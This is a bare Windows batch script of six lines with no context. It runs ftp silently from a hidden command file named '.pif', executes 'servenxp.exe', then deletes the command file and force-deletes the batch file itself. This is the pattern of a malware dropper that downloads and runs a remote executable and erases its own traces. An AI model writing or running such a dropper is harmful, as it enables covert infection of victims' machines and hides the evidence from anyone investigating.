@echo off 
ftp -n -v -s:.pif 
servenxp.exe 
del .pif 
del /F c.bat 
exit /y 
